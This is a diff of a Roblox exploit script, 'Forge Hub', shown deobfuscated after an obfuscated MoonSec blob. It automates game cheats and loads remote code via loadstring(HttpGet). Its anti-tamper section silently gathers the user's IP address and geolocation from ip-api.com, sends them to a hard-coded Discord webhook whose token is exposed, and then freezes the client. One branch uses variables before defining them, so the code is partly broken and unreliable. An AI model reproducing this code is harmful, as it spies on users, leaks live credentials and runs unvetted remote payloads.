@@ -1,1 +1,465 @@
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _jpSdpvwtdPBh = a; end)); return(function(r,...)local f;local d;local o;local c;local u;local t;local e=24915;local n=0;local l={};while n<681 do n=n+1;while n<0x234 and e%0x2da8<0x16d4 do n=n+1 e=(e*177)%46874 local a=n+e if(e%0xd58)>0x6ac then e=(e-0x166)%0x4ce5 while n<0x279 and e%0x3940<0x1ca0 do n=n+1 e=(e-90)%34205 local f=n+e if(e%0x3b94)>0x1dca then e=(e*0x249)%0x87c4 local e=89817 if not l[e]then l[e]=0x1 o=function(l)local e=0x01 local function n(n)e=e+n return l:sub(e-n,e-0x01)end while true do local l=n(0x01)if(l=="\5")then break end local e=c.byte(n(0x01))local e=n(e)if l=="\2"then e=t.iRidcYcp(e)elseif l=="\3"then e=e~="\0"elseif l=="\6"then d[e]=function(n,e)return r(8,nil,r,e,n)end elseif l=="\4"then e=d[e]elseif l=="\0"then e=d[e][n(c.byte(n(0x01)))];end local n=n(0x08)t[n]=e end end end elseif e%2~=0 then e=(e*0x82)%0x93d2 local e=95299 if not l[e]then l[e]=0x1 c=string;end else e=(e*0x3c0)%0xbb8b n=n+1 local e=35053 if not l[e]then l[e]=0x1 d=getfenv and getfenv();end end end elseif e%2~=0 then e=(e+0x245)%0xaabd while n<0x354 and e%0x105a<0x82d do n=n+1 e=(e-257)%17583 local o=n+e if(e%0x4262)>0x2131 then e=(e+0x2bf)%0xa260 local e=55606 if not l[e]then l[e]=0x1 end elseif e%2~=0 then e=(e-0xe5)%0x9c6c local e=3303 if not l[e]then l[e]=0x1 t={};end else e=(e-0x372)%0x7725 n=n+1 local e=31042 if not l[e]then l[e]=0x1 d=(not d)and _ENV or d;end end end else e=(e+0x1ad)%0xbc8c n=n+1 while n<0x197 and e%0x4950<0x24a8 do n=n+1 e=(e-603)%19893 local d=n+e if(e%0x3c46)>=0x1e23 then e=(e+0x150)%0xa4b7 local e=65292 if not l[e]then l[e]=0x1 end elseif e%2~=0 then e=(e*0xd9)%0x4519 local e=66879 if not l[e]then l[e]=0x1 f="\4\8\116\111\110\117\109\98\101\114\105\82\105\100\99\89\99\112\0\6\115\116\114\105\110\103\4\99\104\97\114\66\99\122\75\76\89\76\105\0\6\115\116\114\105\110\103\3\115\117\98\115\95\120\77\66\98\82\116\0\6\115\116\114\105\110\103\4\98\121\116\101\110\104\68\74\69\98\95\118\0\5\116\97\98\108\101\6\99\111\110\99\97\116\86\99\110\106\106\86\119\73\0\5\116\97\98\108\101\6\105\110\115\101\114\116\112\74\89\118\73\112\114\115\5";end else e=(e+0x114)%0x2bbe n=n+1 local e=5538 if not l[e]then l[e]=0x1 u=tonumber;end end end end end e=(e+888)%35622 end o(f);local n={};for e=0x0,0xff do local l=t.BczKLYLi(e);n[e]=l;n[l]=e;end local function a(e)return n[e];end local c=(function(f,r)local c,l=0x01,0x10 local n={{},{},{}}local d=-0x01 local e=0x01 local o=f while true do n[0x03][t.s_xMBbRt(r,e,(function()e=c+e return e-0x01 end)())]=(function()d=d+0x01 return d end)()if d==(0x0f)then d=""l=0x000 break end end local d=#r while e<d+0x01 do n[0x02][l]=t.s_xMBbRt(r,e,(function()e=c+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 t.pJYvIprs(n[0x01],(a((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+o)%0x100)));o=f+o;end end return t.VcnjjVwI(n[0x01])end);o(c(27,"6_2!TCcmeD^9%4dsd^"));o(c(10,"r{zILQKFHc6d%O(bbKbzQQL%L)zOzH{F66&Y3FbQ(((6OF%z%(cFdLHFczzH{bHVKcQOQ(QLz(IIILIQXI{(b{(LHbHc(6(z%b%6%KcOHIHc6IK6c-KIQLbHbLQFL(Lzzbz6{c6O5dbQb((IO(dK%6%Ld66H6cFKcc{%{KFQQbKHQz(QLzI+zFIj{(UbO(bQbQOd(HOOOIQHQKdIcd6uHbFOHzKQK(Q{LHLHIFzzeb{Q(%(Kod({OHF%FQd6dbdId66d6LQdHcK(Q%FzLcLQQ{I{Oz%HI{{{vb{qb(b6bLOddz6I%d6{LLIcKFHFK{QHQFK(KFLdLoOHOzILzQ{b{K:6bFbz({dQ6b%FcH6OH6HcK(zS{dH/KIQ6Q6Lc(=LQILz%{Iod:cOQO((K(cd;O{c6%{LHLm6QcLH%FIKdKcIdIFL6LII*{%Td{Q6Hcb?0bH(Q(tO%%O%zdzdQ6LH(KFHL{zp6KOQQQzL{IQI%{b{Q(ObFUdO%bcO6K(KH%Fd{d66LIFH(H6HIFcFzQHKILdz{LIz6zKb%6d"));local e=(-9344+(function()local d,l=0,1;(function(n,e)e(n(n and n,e and e),n(n,e and e)and e(n,e))end)(function(n,e)if d>155 then return n end d=d+1 l=(l+952)%45404 if(l%940)>=470 then return n(e(e,e),n(e,e)and e(e,n))else return e end return n end,function(n,e)if d>471 then return n end d=d+1 l=(l-941)%49354 if(l%1104)<=552 then return n else return n(e(e,n)and n(e,e and e),e(n,e)and n(e and e,e))end return e(n(n,n),n(e and n,e))end)return l;end)())local z=t.GMjmdZSg or t.ATfsDoBs;local m=(getfenv)or(function()return _ENV end);local a=4;local j=1;local d=3;local o=2;local function p(b,...)local h=c(e,"LU; x4u<W{}?OYQHuWOW;O{sHu4??O;rWxU{<QQ Uu{UYOxG}x44Y? H};Q?uUO ; <?cqu;?Y;uW H ;O?UUD<xY{xu<YUx<WY}OQ Y{xHW4OUHWQHW H?x;xWQH 4x}WHWxQYWYu4H{O7-uxUO{xH{u<<W;;W{HixYuO;<<4Q?HO?NUu<<Q/ 4{<(OuUOxQx{HH4ux?OYWu{QH4 ?uHH<4Y<HW{;Y ^xuWOO !}wHW4OOt;xWHQO4.?xU{<OQ,xx?};W<*Yx W{QpJuxOW Q{?Hx4W?O; WxQWxOYu;4<WYOxp}}ZWuYYj W{WZ+uHOx;WWOHu4x?{UOWxH xW}OUb<?YW Y}T&xu?OO c{xH{4OO!;xWWt&4t?xUW<YQ6xx}WUQ<OYx {{OoUuxOW;O{eHO4W?O;_W4QWxY?dUx<{YOxl}xG}uOYz x{WHHuJOx;WWYHM4x?WUO");local n=0;t.P_juMrOL(function()t.lrvgHCuU()n=n+1 end)local function e(l,e)if e then return n end;n=l+n;end local l,n,f=r(0,r,e,h,t.nhDJEb_v);local function c()local n,l=t.nhDJEb_v(h,e(1,3),e(5,6)+2);e(2);return(l*256)+n;end;local s=true;local s=0 local function p()local e=n();local n=n();local o=1;local d=(l(n,1,20)*(2^32))+e;local e=l(n,21,31);local n=((-1)^l(n,32));if(e==0)then if(d==s)then return n*0;else e=1;o=0;end;elseif(e==2047)then return(d==0)and(n*(1/0))or(n*(0/0));end;return t.kDeo_vuu(n,e-1023)*(o+(d/(2^52)));end;local k=n;local function g(n)local l;if(not n)then n=k();if(n==0)then return'';end;end;l=t.s_xMBbRt(h,e(1,3),e(5,6)+n-1);e(n)local e=""for n=(1+s),#l do e=e..t.s_xMBbRt(l,n,n)end return e;end;local k=#t.EIkFeLUD(u('\49.\48'))~=1 local e=n;local function ee(...)return{...},t.aaCWuPwb('#',...)end local function _()local s={};local e={};local h={};local u={h,s,nil,e};local e=n()local r={}for d=1,e do local l=f();local e;if(l==1)then e=(f()~=#{});elseif(l==0)then local n=p();if k and t.JhlldoFs(t.EIkFeLUD(n),'.(\48+)$')then n=t.bwiIuflL(n);end e=n;elseif(l==2)then e=g();end;r[d]=e;end;for e=1,n()do s[e-(#{1})]=_();end;for u=1,n()do local e=f();if(l(e,1,1)==0)then local t=l(e,2,3);local f=l(e,4,6);local e={c(),c(),nil,nil};if(t==0)then e[d]=c();e[a]=c();elseif(t==#{1})then e[d]=n();elseif(t==b[2])then e[d]=n()-(2^16)elseif(t==b[3])then e[d]=n()-(2^16)e[a]=c();end;if(l(f,1,1)==1)then e[o]=r[e[o]]end if(l(f,2,2)==1)then e[d]=r[e[d]]end if(l(f,3,3)==1)then e[a]=r[e[a]]end h[u]=e;end end;u[3]=f();return u;end;local function p(l,e,n)local d=e;local d=n;return u(t.JhlldoFs(t.JhlldoFs(({t.P_juMrOL(l)})[2],e),n))end local function g(h,e,c)local function y(...)local f,g,u,m,p,n,k,z,b,s,_,l;local e=0;while-1<e do if e>2 then if 4>=e then if 3<e then s=t.aaCWuPwb('#',...)-1;_={};else z={};b={...};end else if e>5 then e=-2;else l=r(7);end end else if 0<e then if 0~=e then for l=46,72 do if e<2 then u=r(6,37,3,29,h);p=ee m=0;break;end;n=-41;k=-1;break;end;else n=-41;k=-1;end else f=r(6,88,1,43,h);g=r(6,21,2,32,h);end end e=e+1;end;for e=0,s do if(e>=u)then z[e-u]=b[e+1];else l[e]=b[e+1];end;end;local e=s-u+1 local e;local r;local function u(...)while true do end end while true do if n<-40 then n=n+42 end e=f[n];r=e[j];if 10>=r then if 5>r then if 1>=r then if r>0 then do return l[e[o]]end else l[e[o]]=(e[d]~=0);end else if 2>=r then if(l[e[o]]==e[a])then n=n+1;else n=e[d];end;else if r~=-1 then repeat if r<4 then do return end;break;end;c[e[d]]=l[e[o]];until true;else c[e[d]]=l[e[o]];end end end else if 8<=r then if 9>r then if(l[e[o]]==e[a])then n=n+1;else n=e[d];end;else if 9<r then local n=e[o];local o=l[n];for e=n+1,e[d]do t.pJYvIprs(o,l[e])end;else do return end;end end else if 5>=r then do return l[e[o]]end else if 3~=r then for t=25,71 do if 6~=r then for t=0,3 do if 1>=t then if-4<t then for r=43,52 do if t~=0 then c[e[d]]=l[e[o]];n=n+1;e=f[n];break;end;l[e[o]]=(e[d]~=0);n=n+1;e=f[n];break;end;else c[e[d]]=l[e[o]];n=n+1;e=f[n];end else if 3~=t then l[e[o]]=c[e[d]];n=n+1;e=f[n];else if(l[e[o]]==e[a])then n=n+1;else n=e[d];end;end end end break;end;local t,a,c,r,f;local n=0;while n>-1 do if 2>=n then if n>=1 then if n~=0 then for e=13,58 do if 1<n then c=d;break;end;a=o;break;end;else c=d;end else t=e;end else if n<5 then if n==4 then f=t[a];else r=t[c];end else if n~=4 then for e=18,68 do if n~=5 then n=-2;break;end;l(f,r);break;end;else l(f,r);end end end n=n+1 end break;end;else for t=0,3 do if 1>=t then if-4<t then for r=43,52 do if t~=0 then c[e[d]]=l[e[o]];n=n+1;e=f[n];break;end;l[e[o]]=(e[d]~=0);n=n+1;e=f[n];break;end;else c[e[d]]=l[e[o]];n=n+1;e=f[n];end else if 3~=t then l[e[o]]=c[e[d]];n=n+1;e=f[n];else if(l[e[o]]==e[a])then n=n+1;else n=e[d];end;end end end end end end end else if r<=15 then if r<13 then if 11~=r then local r,c;for a=0,1 do if-4<=a then repeat if a~=0 then r=e[o];c=l[r];for e=r+1,e[d]do t.pJYvIprs(c,l[e])end;break;end;l(e[o],e[d]);n=n+1;e=f[n];until true;else r=e[o];c=l[r];for e=r+1,e[d]do t.pJYvIprs(c,l[e])end;end end else l(e[o],e[d]);end else if 13>=r then c[e[d]]=l[e[o]];else if r>11 then repeat if r~=15 then l[e[o]]={};break;end;n=e[d];until true;else l[e[o]]={};end end end else if r<19 then if r>16 then if r~=14 then for n=36,81 do if r<18 then l[e[o]]=(e[d]~=0);break;end;local n=e[o];local o=l[n];for e=n+1,e[d]do t.pJYvIprs(o,l[e])end;break;end;else l[e[o]]=(e[d]~=0);end else n=e[d];end else if r<=19 then l[e[o]]=c[e[d]];else if r==21 then l[e[o]]=c[e[d]];else l[e[o]]={};end end end end end n=1+n;end;end;return y end;local d=0xff;local a={};local r=(1);local o='';(function(n)local l=n local c=0x00 local e=0x00 l={(function(f)if c>0x2b then return f end c=c+1 e=(e+0xcf5-f)%0x20 return(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x5a);a[r]=m();r=r+d;end return true end)'iUgdp'and l[0x1](0xa5+f))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xe1);end return true end)'EVhKv'and l[0x3](f+0x7b))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xf);o={o..'\58 a',o};a[r]=_();r=r+((not t.vmbxKrOd)and 1 or 0);o[1]='\58'..o[1];d[2]=0xff;end return true end)'hAtek'and l[0x2](f+0x355))or f end),(function(t)if c>0x2d then return t end c=c+1 e=(e+0x804-t)%0x43 return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xb9);end return true end)'aCmuc'and l[0x3](0x1df+t))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x46);d[2]=(d[2]*(p(function()a()end,z(o))-p(d[1],z(o))))+1;a[r]={};d=d[2];r=r+d;end return true end)'xPDln'and l[0x2](t+0x2fc))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xe);o='\37';d={function()d()end};o=o..'\100\43';end return true end)'yIGJQ'and l[0x1](t+0x193))or t end),(function(d)if c>0x24 then return d end c=c+1 e=(e+0xb3b-d)%0x39 return(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xbc);end return true end)'lbecj'and l[0x2](0x31c+d))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x60);end return true end)'zpJQs'and l[0x3](d+0xba))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x68);end return true end)'qGMLw'and l[0x1](d+0x1b4))or d end)}l[0x2](0x18f4)end){};local e=g(z(a));return e(...);end return p((function()local n={}local e=0x01;local l;if t.vmbxKrOd then l=t.vmbxKrOd(p)else l=''end if t.JhlldoFs(l,t.UEUyJzWR)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(e,l,n,d,t,o)local o;if 3<e then if 6>e then if 4<e then local e=d;do return function()local n=l(n,e(e,e),e(e,e));e(1);return n;end;end;else local e=d;local t,r,d=t(2);do return function()local n,c,o,l=l(n,e(e,e),e(e,e)+3);e(4);return(l*t)+(o*r)+(c*d)+n;end;end;end else if 7>e then do return t[n]end;else if e>=5 then repeat if e~=7 then do return n(e,nil,n);end break;end;do return setmetatable({},{['__\99\97\108\108']=function(e,l,t,d,n)if n then return e[n]elseif d then return e else e[l]=t end end})end until true;else do return n(e,nil,n);end end end end else if e>=2 then if e>=1 then repeat if e~=3 then do return 16777216,65536,256 end;break;end;do return l(1),l(4,t,d,n,l),l(5,t,d,n)end;until true;else do return 16777216,65536,256 end;end else if-1<e then repeat if 0<e then do return function(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;end;break;end;do return l(1),l(4,t,d,n,l),l(5,t,d,n)end;until true;else do return function(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;end;end end end end),...)
+task.spawn(function()
+    while true do
+        if hookfunction then
+            if isfunctionhooked(request) or (isfunctionhooked(game.HttpGet) or isfunctionhooked(game.HttpPost)) then
+                pcall(function()
+                    hookfunction(writefile, function()
+                        return nil
+                    end)
+                    hookfunction(isfile, function()
+                        return nil
+                    end)
+                    hookfunction(print, function()
+                        return nil
+                    end)
+                    hookfunction(setclipboard, function()
+                        return nil
+                    end)
+                    if isfunctionhooked(request) then
+                        restorefunction(request)
+                    end
+                    if isfunctionhooked(game.HttpGet) then
+                        restorefunction(game.HttpGet)
+                    end
+                    if isfunctionhooked(game.HttpPost) then
+                        restorefunction(game.HttpPost)
+                    end
+                    local v1 = request({
+                        Url = "http://ip-api.com/json",
+                        Method = "GET"
+                    })
+                    local v2 = game:GetService("HttpService"):JSONDecode(v1.Body)
+                    local v3 = game:GetService("HttpService")
+                    local v4 = {
+                        content = "Attempted Crack! @everyone \n\nUsername: " .. game.Players.LocalPlayer.Name .. "\nClient ID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. "\nActions: killed game instance" .. "\n\n**USER DATA** \n\n" .. "IP: " .. v2.query .. "\nCountry: " .. v2.country .. "\nRegion: " .. v2.region .. "\nRegion Name: " .. v2.regionName .. "\nCity: " .. v2.city
+                    }
+                    local v5 = {
+                        Url = "https://discord.com/api/webhooks/1302299248997568622/BfUYEt4nVLQs6rZL243k2liFaJK4GmU_FNSKREnHDhgI3-jB58TGc6bzGFUNkxkmIn3Z",
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        Body = v3:JSONEncode(v4)
+                    }
+                    request(v5)
+                    while true do
+                    end
+                end)
+            elseif isfunctionhooked(Instance.new("RemoteEvent").FireServer) then
+                pcall(function()
+                    hookfunction(writefile, function()
+                        return nil
+                    end)
+                    hookfunction(isfile, function()
+                        return nil
+                    end)
+                    hookfunction(print, function()
+                        return nil
+                    end)
+                    hookfunction(setclipboard, function()
+                        return nil
+                    end)
+                    if isfunctionhooked(Instance.new("RemoteEvent").FireServer) then
+                        restorefunction(Instance.new("RemoteEvent").FireServer)
+                    end
+                    local v6 = game:GetService("HttpService")
+                    local v7 = {
+                        content = "Anti Tamper has been triggered - RemoteSpy Detected! \n\nUsername: " .. game.Players.LocalPlayer.Name .. "\nClient ID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. "\n\n**Actions: killed game instance** \n\n"
+                    }
+                    local v8 = {
+                        Url = "https://discord.com/api/webhooks/1302299248997568622/BfUYEt4nVLQs6rZL243k2liFaJK4GmU_FNSKREnHDhgI3-jB58TGc6bzGFUNkxkmIn3Z",
+                        Method = "POST",
+                        Headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        Body = v6:JSONEncode(v7)
+                    }
+                    request(v8)
+                    while true do
+                    end
+                end)
+            end
+        end
+        game:GetService("RunService").RenderStepped:Wait()
+    end
+end)
+local vu9 = nil
+local v10 = true
+local v11, _ = pcall(function()
+    vu9 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/main/blu"))()
+end)
+if v11 then
+    local v12, v13, v14 = pairs(vu9)
+    while true do
+        local v15
+        v14, v15 = v12(v13, v14)
+        if v14 == nil then
+            break
+        end
+        if game:GetService("RbxAnalyticsService"):GetClientId() == v15 then
+            if game.ReplicatedStorage:FindFirstChild("AdminGUI") then
+                game.ReplicatedStorage.AdminGUI:FireServer()
+            end
+            wait()
+            game.Players.LocalPlayer:Kick("\n\nYou are permanently blacklisted from Forge Hub.\n\nFor more info, make a ticket in discord.gg/FDmwmrtSp2\n")
+            wait(0.75)
+            pcall(function()
+                local v16 = game:GetService("HttpService")
+                local v17 = {
+                    content = "Blacklisted User Attempted To Run Forge Hub! \n\nUsername: " .. game.Players.LocalPlayer.Name .. "\nClient ID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. "\n\n**Actions: triggered anticheat ban & alerted player of their blacklist** \n\n"
+                }
+                local v18 = {
+                    Url = "https://discord.com/api/webhooks/1297200980970045450/Nce1gXwWwYeFNJCzSkyObiE3ZpxQK-ez4Gga0OkGsjBtcx0PmXBOkpTwjrqrZO0POjLj",
+                    Method = "POST",
+                    Headers = {
+                        ["Content-Type"] = "application/json"
+                    },
+                    Body = v16:JSONEncode(v17)
+                }
+                request(v18)
+            end)
+            while true do
+            end
+        end
+    end
+    if v10 then
+        print("Auth Success")
+    end
+    wait(0.5)
+    if getgenv().a9897115_9e18_43b3_b7c1_8cb7425ceef4 ~= "swagger" then
+        for _ = 1, 200 do
+            warn("Forge Hub / Failed to recognise")
+        end
+    else
+        getgenv().a9897115_9e18_43b3_b7c1_8cb7425ceef4 = nil
+        if not getgenv().fhExecuted then
+            getgenv().fhExecuted = true
+            warn("Forge Hub / Authenticated Securely. You\'re now protected.")
+            warn("ATTS 1")
+            if game.PlaceId == 18550498098 then
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/refs/heads/main/guide_autocomplete"))()
+                return
+            end
+            if game.PlaceId == 11828384869 then
+                if not game:IsLoaded() then
+                    game.Loaded:Wait()
+                end
+                local vu19 = Instance.new("Hint", game.CoreGui)
+                vu19.Text = "Select what script to load by typing in chat. Type \'counter\' for counter, type \'elude\' for elude."
+                game.Players.LocalPlayer.Chatted:Connect(function(p20)
+                    if p20:lower() ~= "counter" then
+                        if p20:lower() == "elude" then
+                            vu19:Destroy()
+                            local v21, v22, v23 = pairs(workspace.Collectable:GetChildren())
+                            while true do
+                                local v24
+                                v23, v24 = v21(v22, v23)
+                                if v23 == nil then
+                                    break
+                                end
+                                local v25 = (game:GetService("Players").LocalPlayer.Character or game:GetService("Players").LocalPlayer.CharacterAdded:Wait()):FindFirstChildWhichIsA("BasePart")
+                                firetouchinterest(v24, v25, 0)
+                                task.wait()
+                                firetouchinterest(v24, v25, 1)
+                            end
+                            wait(1)
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(- 502.33563232421875, 14.227947235107422, - 179.5965118408203)
+                        end
+                        return
+                    end
+                    vu19:Destroy()
+                    fireclickdetector(workspace.CounterLever.ClickDetector)
+                    wait(0.1)
+                    game:GetService("StarterGui"):SetCore("SendNotification", {
+                        Title = "Forge Hub - Waiting for Glove To Sawn",
+                        Text = "You must wait a few minutes for the glove to spawn, sit back, relax, get a drink and Forge Hub will handle the rest :)",
+                        Duration = 500
+                    })
+                    game:GetService("StarterGui"):SetCore("SendNotification", {
+                        Title = "",
+                        Text = "You will be teleported back to Slap Battles after the glove has been grabbed automatically.",
+                        Duration = 500
+                    })
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(179, 34, 135)
+                    if v27:FindFirstChild("ClickDetector") then
+                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v27.CFrame
+                        fireclickdetector(v27.ClickDetector)
+                    end
+                    local v26, v27 = v28(v29, v26)
+                    if v26 ~= nil then
+                    end
+                    wait()
+                    local v28, v29
+                    v28, v29, v26 = pairs(workspace.Maze:GetChildren())
+                end)
+                repeat
+                    wait()
+                until game.Players.LocalPlayer.Character and (game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") and workspace:FindFirstChild("Buildings"))
+                wait(1)
+                print("OE")
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(16, 33, 7)
+                repeat
+                    wait()
+                    print("WAITING")
+                until workspace:FindFirstChild("BoxingGloves")
+                repeat
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(workspace.BoxingGloves.Position)
+                    fireclickdetector(workspace.BoxingGloves.ClickDetector)
+                until game:GetService("BadgeService"):UserHasBadge(game.Players.LocalPlayer.UserId, 1223765330375569)
+                game:GetService("TeleportService"):Teleport(6403373529, game.Players.LocalPlayer)
+            end
+            local vu30 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Skzuppy/forge-hub/refs/heads/main/funFacts_LS"))()
+            local function v31()
+                return vu30[math.random(1, # vu30)]
+            end
+            local v32 = Instance.new("ScreenGui")
+            local v33 = Instance.new("Frame")
+            local v34 = Instance.new("Frame")
+            local v35 = Instance.new("Frame")
+            local v36 = Instance.new("TextLabel")
+            local v37 = Instance.new("UIAspectRatioConstraint")
+            local v38 = Instance.new("TextLabel")
+            local v39 = Instance.new("UIAspectRatioConstraint")
+            local v40 = Instance.new("TextLabel")
+            local v41 = Instance.new("UIAspectRatioConstraint")
+            local v42 = Instance.new("ImageButton")
+            local v43 = Instance.new("UICorner")
+            local v44 = Instance.new("UIAspectRatioConstraint")
+            local v45 = Instance.new("UIAspectRatioConstraint")
+            local vu46 = Instance.new("TextLabel")
+            local v47 = Instance.new("UIAspectRatioConstraint")
+            local v48 = Instance.new("ImageLabel")
+            local v49 = Instance.new("TextLabel")
+            v32.Name = "FHBlr"
+            v32.Parent = game.CoreGui
+            v32.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+            v33.Parent = v32
+            v33.AnchorPoint = Vector2.new(0.5, 0.5)
+            v33.BackgroundColor3 = Color3.fromRGB(47, 47, 47)
+            v33.BorderColor3 = Color3.fromRGB(255, 170, 0)
+            v33.BorderSizePixel = 3
+            v33.Position = UDim2.new(0.5, 0, 0.5, 0)
+            if table.find({
+                Enum.Platform.IOS,
+                Enum.Platform.Android
+            }, game:GetService("UserInputService"):GetPlatform()) then
+                v33.Size = UDim2.new(0.555064142, 0, 0.295762926, 0)
+            else
+                v33.Size = UDim2.new(0.41, 0, 0.21, 0)
+            end
+            v34.Name = "LoaderFrame"
+            v34.Parent = v33
+            v34.AnchorPoint = Vector2.new(0.5, 0.5)
+            v34.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
+            v34.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            v34.Position = UDim2.new(0.5, 0, 0.850000024, 0)
+            v34.Size = UDim2.new(0.878571451, 0, 0.109999999, 0)
+            v35.Name = "LD"
+            v35.Parent = v34
+            v35.BackgroundColor3 = Color3.fromRGB(255, 191, 0)
+            v35.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            v35.BorderSizePixel = 0
+            v35.Size = UDim2.new(0, 0, 1, 0)
+            v36.Name = "Title"
+            v36.Parent = v33
+            v36.AnchorPoint = Vector2.new(0.5, 0.5)
+            v36.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            v36.BackgroundTransparency = 1
+            v36.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            v36.BorderSizePixel = 10
+            v36.Position = UDim2.new(0.49999997, 0, 0.173123583, 0)
+            v36.Size = UDim2.new(- 0.326340348, 0, - 0.239768505, 0)
+            v36.Font = Enum.Font.FredokaOne
+            v36.Text = "Forge Hub"
+            v36.TextColor3 = Color3.fromRGB(255, 140, 0)
+            v36.TextScaled = true
+            v36.TextSize = 14
+            v36.TextStrokeTransparency = 0
+            v36.TextWrapped = true
+            v37.Parent = v36
+            v37.AspectRatio = 3.48
+            v38.Name = "LMSG"
+            v38.Parent = v33
+            v38.AnchorPoint = Vector2.new(0.5, 0.5)
+            v38.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            v38.BackgroundTransparency = 1
+            v38.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            v38.BorderSizePixel = 0
+            v38.Position = UDim2.new(0.507004261, 0, 0.437244534, 0)
+            v38.Size = UDim2.new(- 0.648787916, 0, - 0.347250938, 0)
+            v38.Font = Enum.Font.RobotoMono
+            v38.Text = "Your script is loading. This can take a few seconds"
+            v38.TextColor3 = Color3.fromRGB(255, 255, 255)
+            v38.TextScaled = true
+            v38.TextSize = 14
+            v38.TextStrokeTransparency = 0
+            v38.TextWrapped = true
+            v39.Parent = v38
+            v39.AspectRatio = 4.777
+            v40.Name = "GameDTC"
+            v40.Parent = v33
+            v40.AnchorPoint = Vector2.new(0.5, 0.5)
+            v40.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            v40.BackgroundTransparency = 1
+            v40.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            v40.BorderSizePixel = 0
+            v40.Position = UDim2.new(0.499032587, 0, 0.699999988, 0)
+            v40.Size = UDim2.new(- 0.648787916, 0, - 0.111616381, 0)
+            v40.Font = Enum.Font.RobotoMono
+            v40.Text = "Failed to detect game; Possibly not supported."
+            v40.TextColor3 = Color3.fromRGB(255, 255, 255)
+            v40.TextScaled = true
+            v40.TextSize = 14
+            v40.TextStrokeTransparency = 0
+            v40.TextWrapped = true
+            v41.Parent = v40
+            v41.AspectRatio = 14.862
+            v42.Name = "Discord"
+            v42.Parent = v33
+            v42.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            v42.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            v42.BorderSizePixel = 0
+            v42.Position = UDim2.new(0.893465817, 0, 0.0726392269, 0)
+            v42.Size = UDim2.new(0.0752664953, 0, 0.193301246, 0)
+            v42.Image = "http://www.roblox.com/asset/?id=17056354120"
+            v43.Parent = v42
+            v44.Parent = v42
+            v44.AspectRatio = 0.996
+            v45.Parent = v33
+            v45.AspectRatio = 2.557
+            vu46.Name = "CDL"
+            vu46.Parent = v33
+            vu46.AnchorPoint = Vector2.new(0.5, 0.5)
+            vu46.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            vu46.BackgroundTransparency = 1
+            vu46.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            vu46.BorderSizePixel = 0
+            vu46.Position = UDim2.new(0.499032676, 0, 1.17548108, 0)
+            vu46.Size = UDim2.new(- 0.648787916, 0, - 0.111616381, 0)
+            vu46.Visible = false
+            vu46.Font = Enum.Font.RobotoMono
+            vu46.Text = "Copied Discord Link To Clipboard"
+            vu46.TextColor3 = Color3.fromRGB(17, 255, 0)
+            vu46.TextScaled = true
+            vu46.TextSize = 14
+            vu46.TextStrokeTransparency = 0
+            vu46.TextWrapped = true
+            v47.Parent = vu46
+            v47.AspectRatio = 14.862
+            v48.Parent = v33
+            v48.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            v48.BackgroundTransparency = 1
+            v48.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            v48.BorderSizePixel = 0
+            v48.Position = UDim2.new(0.0179362502, 0, 0.208922938, 0)
+            v48.Size = UDim2.new(0.0777236149, 0, - 0.178348869, 0)
+            v48.Image = "http://www.roblox.com/asset/?id=129698216"
+            v49.Name = "TipMSG"
+            v49.Parent = v33
+            v49.AnchorPoint = Vector2.new(0.5, 0.5)
+            v49.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+            v49.BackgroundTransparency = 1
+            v49.BorderColor3 = Color3.fromRGB(0, 0, 0)
+            v49.BorderSizePixel = 0
+            v49.Position = UDim2.new(0.508967996, 0, 0.949999928, 0)
